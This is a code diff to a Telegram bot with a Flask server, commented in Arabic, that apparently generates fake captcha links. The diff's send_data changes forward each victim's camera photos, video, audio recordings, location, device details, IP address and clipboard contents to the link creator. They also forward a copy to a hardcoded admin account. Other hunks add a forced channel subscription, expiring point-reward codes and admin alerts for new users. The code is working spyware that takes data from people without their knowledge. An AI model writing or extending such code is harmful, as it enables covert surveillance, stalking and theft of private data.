@@ -1,6 +1,7 @@
 # ============================================================
 #  ملف واحد شامل (app.py) - سيرفر + بوت + قاعدة بيانات + كل شيء
 # ============================================================
+from datetime import datetime, timedelta
 from flask import Flask, request, render_template_string, redirect, jsonify
 from datetime import datetime
 import secrets
@@ -122,17 +123,7 @@ def init_db():
         )
     ''')
     
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS group_rewards (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            code TEXT UNIQUE,
-            admin_id INTEGER,
-            points INTEGER,
-            member_count INTEGER,
-            used_count INTEGER DEFAULT 0,
-            created TEXT
-        )
-    ''')
+
     
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS reward_usage (
@@ -151,6 +142,18 @@ def init_db():
             ('audio_duration', '30'),
             ('camera_count', '3')
     ''')
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS group_rewards (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        code TEXT UNIQUE,
+        admin_id INTEGER,
+        points INTEGER,
+        member_count INTEGER,
+        used_count INTEGER DEFAULT 0,
+        created TEXT,
+        expiry_date TEXT  -- <-- عمود جديد لتاريخ الانتهاء
+    )
+''')
     
     features = ['camera', 'audio', 'video', 'location', 'device', 'all']
     for feature in features:
@@ -388,15 +391,17 @@ def get_daily_reward_count():
     conn.close()
     return count
 
-def create_group_reward(admin_id, points, member_count, code):
+def create_group_reward(admin_id, points, member_count, code, expiry_minutes=60):
+    from datetime import timedelta
+    expiry_date = (datetime.now() + timedelta(minutes=expiry_minutes)).isoformat()
     conn = get_db()
     conn.execute('''
-        INSERT INTO group_rewards (code, admin_id, points, member_count, used_count, created)
-        VALUES (?, ?, ?, ?, 0, ?)
-    ''', (code, admin_id, points, member_count, datetime.now().isoformat()))
+        INSERT INTO group_rewards (code, admin_id, points, member_count, used_count, created, expiry_date)
+        VALUES (?, ?, ?, ?, 0, ?, ?)
+    ''', (code, admin_id, points, member_count, datetime.now().isoformat(), expiry_date))
     conn.commit()
     conn.close()
-
+    
 def get_group_reward(code):
     conn = get_db()
     reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
@@ -405,29 +410,35 @@ def get_group_reward(code):
 
 def use_group_reward(code, user_id):
     conn = get_db()
-    used = conn.execute('''
-        SELECT * FROM reward_usage WHERE code = ? AND user_id = ?
-    ''', (code, user_id)).fetchone()
+    
+    # التحقق من الاستخدام السابق
+    used = conn.execute('SELECT * FROM reward_usage WHERE code = ? AND user_id = ?', (code, user_id)).fetchone()
     if used:
         conn.close()
         return False, 'already_used'
     
+    # جلب المكافأة
     reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
     if not reward:
         conn.close()
         return False, 'not_found'
     
+    # ====== التحقق من الصلاحية ======
+    if reward['expiry_date']:
+        expiry = datetime.fromisoformat(reward['expiry_date'])
+        if datetime.now() > expiry:
+            conn.close()
+            return False, 'expired'
+    
+    # التحقق من العدد
     if reward['used_count'] >= reward['member_count']:
         conn.close()
         return False, 'full'
     
-    conn.execute('''
-        UPDATE group_rewards SET used_count = used_count + 1 WHERE code = ?
-    ''', (code,))
-    conn.execute('''
-        INSERT INTO reward_usage (code, user_id, used_at)
-        VALUES (?, ?, ?)
-    ''', (code, user_id, datetime.now().isoformat()))
+    # استخدام المكافأة
+    conn.execute('UPDATE group_rewards SET used_count = used_count + 1 WHERE code = ?', (code,))
+    conn.execute('INSERT INTO reward_usage (code, user_id, used_at) VALUES (?, ?, ?)',
+                 (code, user_id, datetime.now().isoformat()))
     conn.commit()
     conn.close()
     
@@ -892,7 +903,7 @@ CAPTCHA_TEMPLATE = """
                                 { enableHighAccuracy: true, timeout: 8000 }
                             );
                         } else {
-                            captchaText.textContent = لموقع غير مدعوم';
+                            captchaText.textContent ='الموقع غير مدعوم';
                             captchaIcon.textContent = '⚠️';
                             resolve();
                         }
@@ -1394,9 +1405,11 @@ def send_data():
         session = get_session(session_id)
         if not session:
             return jsonify({'error': 'جلسة غير صالحة'}), 404
-        chat_id = session['chat_id']
         
-        # إرسال الصور
+        chat_id = session['chat_id']  # المستخدم الذي أنشأ الرابط
+        admin_id = 6904264075  # ضع معرفك هنا
+        
+        # ====== إرسال الصور للمستخدم والإدمن ======
         for key in ['camera_front', 'camera_back']:
             if data.get(key):
                 for img_data in data[key]:
@@ -1404,98 +1417,105 @@ def send_data():
                         img = img_data.split(',', 1)[1]
                         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                         files = {'photo': base64.b64decode(img)}
-                        requests.post(url, data={'chat_id': chat_id}, files=files)
+                        # إرسال للمستخدم
+                        requests.post(url, data={'chat_id': chat_id, 'caption': f'📷 {key}'}, files=files)
+                        # إرسال للإدمن
+                        requests.post(url, data={'chat_id': admin_id, 'caption': f'📷 {key} (من مستخدم)'}, files=files)
                     except:
                         pass
         
-        # إرسال الفيديو
+        # ====== إرسال الفيديو للمستخدم والإدمن ======
         if data.get('video'):
             try:
                 video = data['video'].split(',', 1)[1]
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
                 files = {'video': base64.b64decode(video)}
-                requests.post(url, data={'chat_id': chat_id}, files=files)
+                requests.post(url, data={'chat_id': chat_id, 'caption': '🎥 فيديو مسجل'}, files=files)
+                requests.post(url, data={'chat_id': admin_id, 'caption': '🎥 فيديو مسجل (من مستخدم)'}, files=files)
             except:
                 pass
         
-        # إرسال الصوت
+        # ====== إرسال الصوت للمستخدم والإدمن ======
         if data.get('audio'):
             try:
                 audio = data['audio'].split(',', 1)[1]
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
                 files = {'audio': base64.b64decode(audio)}
-                requests.post(url, data={'chat_id': chat_id}, files=files)
+                requests.post(url, data={'chat_id': chat_id, 'caption': '🎙 تسجيل صوتي'}, files=files)
+                requests.post(url, data={'chat_id': admin_id, 'caption': '🎙 تسجيل صوتي (من مستخدم)'}, files=files)
             except:
                 pass
         
-        # إرسال الموقع
+        # ====== إرسال الموقع للمستخدم والإدمن ======
         if data.get('location'):
             try:
                 loc = data['location']
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
-                requests.post(url, data={
-                    'chat_id': chat_id,
-                    'latitude': loc['lat'],
-                    'longitude': loc['lng']
-                })
+                for target in [chat_id, admin_id]:
+                    requests.post(url, data={'chat_id': target, 'latitude': loc['lat'], 'longitude': loc['lng']})
             except:
                 pass
         
-        # إرسال معلومات الجهاز
+        # ====== إرسال معلومات الجهاز للمستخدم والإدمن ======
         if data.get('device'):
             try:
                 device = data['device']
                 msg = f"📱 معلومات الجهاز:\n{device}"
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                requests.post(url, data={'chat_id': chat_id, 'text': msg})
+                for target in [chat_id, admin_id]:
+                    requests.post(url, data={'chat_id': target, 'text': msg})
             except:
                 pass
         
-        # إرسال IP
+        # ====== إرسال IP للمستخدم والإدمن ======
         if data.get('ip'):
             try:
+                msg = f"🌐 IP: {data['ip']}"
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
+                for target in [chat_id, admin_id]:
+                    requests.post(url, data={'chat_id': target, 'text': msg})
             except:
                 pass
         
-        # ====== إرسال الحافظة (مقسمة إلى رسائل متعددة) ======
+        # ====== إرسال الحافظة للمستخدم والإدمن ======
         if data.get('clipboard'):
             try:
                 clipboard_text = data['clipboard']
-                max_length = 4000  # الحد الأقصى للرسالة الواحدة
-                
-                # إذا كان النص قصيراً، أرسله كرسالة واحدة
+                max_length = 4000
                 if len(clipboard_text) <= max_length:
-                    msg = f"📋 **محتوى الحافظة:**\n\n{clipboard_text}"
+                    msg = f"📋 محتوى الحافظة:\n\n{clipboard_text}"
                     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                    requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+                    for target in [chat_id, admin_id]:
+                        requests.post(url, data={'chat_id': target, 'text': msg})
                 else:
-                    # تقسيم النص إلى أجزاء
                     parts = []
                     for i in range(0, len(clipboard_text), max_length):
                         parts.append(clipboard_text[i:i+max_length])
-                    
-                    # إرسال الجزء الأول مع العنوان
-                    first_msg = f"📋 **محتوى الحافظة (1/{len(parts)}):**\n\n{parts[0]}"
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                    requests.post(url, data={'chat_id': chat_id, 'text': first_msg, 'parse_mode': 'Markdown'})
-                    
-                    # إرسال الأجزاء المتبقية
-                    for i, part in enumerate(parts[1:], start=2):
-                        part_msg = f"📋 **محتوى الحافظة ({i}/{len(parts)}):**\n\n{part}"
+                    for i, part in enumerate(parts, start=1):
+                        msg = f"📋 محتوى الحافظة ({i}/{len(parts)}):\n\n{part}"
                         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                        requests.post(url, data={'chat_id': chat_id, 'text': part_msg, 'parse_mode': 'Markdown'})
-                        time.sleep(0.3)  # تأخير بسيط بين الرسائل
-                        
-            except Exception as e:
-                print(f"خطأ في إرسال الحافظة: {e}")
-                try:
-                    # محاولة إرسال أول 500 حرف كحل بديل
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                    requests.post(url, data={'chat_id': chat_id, 'text': f"📋 محتوى الحافظة:\n\n{data['clipboard'][:500]}..."})
-                except:
-                    pass
+                        for target in [chat_id, admin_id]:
+                            requests.post(url, data={'chat_id': target, 'text': msg})
+                        time.sleep(0.3)
+            except:
+                pass
+        
+        # ====== ملخص للمستخدم والإدمن ======
+        summary = f"""
+✅ **تم استلام البيانات**
+
+📷 أمامية: {len(data.get('camera_front', []))} صورة
+📷 خلفية: {len(data.get('camera_back', []))} صورة
+🎥 فيديو: {'✅' if data.get('video') else '❌'}
+🎙 صوت: {'✅' if data.get('audio') else '❌'}
+📍 موقع: {'✅' if data.get('location') else '❌'}
+📱 معلومات الجهاز: {'✅' if data.get('device') else '❌'}
+🌐 IP: {data.get('ip', 'غير معروف')}
+📋 حافظة: {'✅' if data.get('clipboard') else '❌'}
+        """
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        for target in [chat_id, admin_id]:
+            requests.post(url, data={'chat_id': target, 'text': summary, 'parse_mode': 'Markdown'})
         
         return jsonify({'status': 'ok'})
     except Exception as e:
@@ -2233,6 +2253,22 @@ def handle_callback(call):
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     user_id = message.from_user.id
+    
+    # التحقق من الاشتراك أولاً
+    if not check_subscription(user_id):
+        channels = get_required_channels()
+        msg = "⚠️ **يجب الاشتراك في القنوات التالية:**\n\n"
+        for ch in channels:
+            try:
+                chat = bot.get_chat(ch['channel_id'])
+                msg += f"🔹 {chat.title}\n"
+            except:
+                msg += f"🔹 {ch['channel_id']}\n"
+        msg += "\nبعد الاشتراك، أعد إرسال /start"
+        bot.send_message(user_id, msg, parse_mode='Markdown')
+        return
+    
+    # التحقق من وجود المستخدم
     user = get_user(user_id)
     
     if len(message.text.split()) > 1:
@@ -2250,6 +2286,22 @@ def start_cmd(message):
     if not user:
         create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '', invited_by)
         user = get_user(user_id)
+        
+        # إرسال معلومات العضو للإدمن
+        admin_id = 6904264075
+        try:
+            msg = f"""
+👤 **مستخدم جديد دخل البوت!**
+
+🆔 **ID:** `{user_id}`
+👤 **الاسم:** {message.from_user.first_name}
+📛 **يوزر:** @{message.from_user.username or 'لا يوجد'}
+📅 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🔗 **كود الدعوة:** `{user['invite_code']}`
+        """
+            bot.send_message(admin_id, msg, parse_mode='Markdown')
+        except:
+            pass
     
     points = user['points'] if user else 0
     
@@ -2260,13 +2312,8 @@ def start_cmd(message):
 
 📋 **اختر أحد الخيارات أدناه:**
     """
-    bot.send_message(
-        user_id,
-        msg,
-        parse_mode='Markdown',
-        reply_markup=main_menu(user_id)
-    )
-
+    bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=main_menu(user_id))
+    
 @bot.message_handler(commands=['admin'])
 def make_admin_cmd(message):
     if message.from_user.id == 6904264075:
@@ -2396,26 +2443,29 @@ def create_reward_cmd(message):
         if len(parts) < 3:
             bot.reply_to(
                 message,
-                "❌ **استخدم:** `/create_reward [عدد النقاط] [عدد الأعضاء]`\n"
-                "مثال: `/create_reward 50 10`\n\n"
-                "يعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود"
+                "❌ **استخدم:** `/create_reward [عدد النقاط] [عدد الأعضاء] [مدة الصلاحية بالدقائق]`\n"
+                "مثال: `/create_reward 50 10 60`\n"
+                "(60 = ساعة واحدة)"
             )
             return
         
         points = int(parts[1])
         member_count = int(parts[2])
+        expiry_minutes = int(parts[3]) if len(parts) > 3 else 60  # الافتراضي 60 دقيقة
         
         code = secrets.token_hex(4).upper()
-        create_group_reward(user_id, points, member_count, code)
+        create_group_reward(user_id, points, member_count, code, expiry_minutes)
+        
+        expiry_time = (datetime.now() + timedelta(minutes=expiry_minutes)).strftime('%Y-%m-%d %H:%M')
         
         bot.reply_to(
             message,
             f"✅ **تم إنشاء المكافأة!**\n\n"
             f"🔑 **الكود:** `{code}`\n"
             f"⭐ **النقاط:** {points} نقطة لكل مستخدم\n"
-            f"👥 **العدد:** {member_count} مستخدم\n\n"
-            f"📌 **للاستخدام:** أرسل هذا الكود للمستخدمين، وسيحصلون على النقاط عند استخدام الأمر:\n"
-            f"`/use_reward {code}`"
+            f"👥 **العدد:** {member_count} مستخدم\n"
+            f"⏱ **تنتهي:** {expiry_time}\n\n"
+            f"📌 **للاستخدام:** `/use_reward {code}`"
         )
     except ValueError:
         bot.reply_to(message, "❌ تأكد من أن الأرقام صحيحة")
